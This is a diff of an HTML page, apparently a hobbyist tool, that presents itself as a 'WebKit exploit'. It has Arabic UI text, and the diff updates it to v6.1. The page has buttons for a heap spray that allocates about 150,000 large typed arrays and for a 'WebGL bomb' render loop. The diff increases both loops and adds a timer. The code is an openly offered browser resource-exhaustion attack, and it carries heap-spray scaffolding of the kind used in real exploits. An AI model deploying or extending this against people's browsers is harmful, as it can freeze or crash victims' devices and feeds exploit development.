@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>MSM WebKit Exploit v5</title>
+    <title>MSM WebKit Exploit v6.1</title>
     <meta charset="UTF-8" />
     <style>
       body {
-        background-color: black;
-        color: lime;
+        background-color: #1a1a1a;
+        color: #00ccff;
         font-family: monospace;
         text-align: center;
         padding-top: 60px;
       }
       button {
         padding: 14px 28px;
-        background-color: crimson;
-        color: white;
+        background-color: #00ccff;
+        color: black;
         border: none;
         font-size: 22px;
         cursor: pointer;
@@ -22,42 +22,61 @@
       }
       canvas {
         margin-top: 20px;
-        border: 2px solid lime;
+        border: 2px solid #00ccff;
       }
-      #status {
+      #status, #timer {
         margin-top: 30px;
         font-size: 18px;
       }
     </style>
   </head>
   <body>
-    <h1>💣 MSM WebKit Exploit v5 – ضغط مزدوج</h1>
+    <h1>⚡ MSM WebKit Exploit v6.1 – ضغط مزدوج + مؤقت</h1>
     <button onclick="startHeap()">🔥 Heap Spray</button>
     <button onclick="startWebGL()">🚀 WebGL Bomb</button>
+    <p id="timer">⏱️ المؤقت: 0 ثانية</p>
     <p id="status">جاهز للتفجير...</p>
     <canvas id="glcanvas" width="512" height="512"></canvas>
 
     <script>
+      let seconds = 0;
+      let timerInterval = null;
+
+      function startTimer() {
+        clearInterval(timerInterval);
+        seconds = 0;
+        document.getElementById("timer").innerText = "⏱️ المؤقت: 0 ثانية";
+        timerInterval = setInterval(() => {
+          seconds++;
+          document.getElementById("timer").innerText = `⏱️ المؤقت: ${seconds} ثانية`;
+        }, 1000);
+      }
+
+      function stopTimer() {
+        clearInterval(timerInterval);
+      }
+
       function startHeap() {
+        startTimer();
         const status = document.getElementById("status");
         status.innerText = "⏳ MSM: بدأ Heap Spray...";
         let total = 0;
-        let start = performance.now();
         try {
-          for (let i = 0; i < 120000; i++) {
+          for (let i = 0; i < 150000; i++) {
             let spray = new Uint32Array(8192);
             spray.fill(i);
             total += spray[0];
           }
-          let end = performance.now();
-          let duration = ((end - start) / 1000).toFixed(2);
-          status.innerText = `✅ MSM: Heap Spray اكتمل خلال ${duration} ثانية – راقب المتصفح!`;
+          status.innerText = `✅ MSM: Heap Spray اكتمل – راقب المتصفح!`;
+          stopTimer();
         } catch (e) {
           status.innerText = "💥 MSM: خطأ أثناء Heap Spray – احتمال خلل!";
+          stopTimer();
         }
       }
 
       function startWebGL() {
+        startTimer();
         const status = document.getElementById("status");
         status.innerText = "⏳ MSM: بدأ WebGL Bomb...";
         const canvas = document.getElementById("glcanvas");
@@ -65,6 +84,7 @@
 
         if (!gl) {
           status.innerText = "❌ MSM: WebGL غير مدعوم!";
+          stopTimer();
           return;
         }
 
@@ -113,10 +133,11 @@
         function render() {
           gl.drawArrays(gl.TRIANGLES, 0, 6);
           frames++;
-          if (frames < 500) {
+          if (frames < 600) {
             requestAnimationFrame(render);
           } else {
             status.innerText = "✅ MSM: WebGL Bomb اكتملت – راقب الأداء!";
+            stopTimer();
           }
         }
 
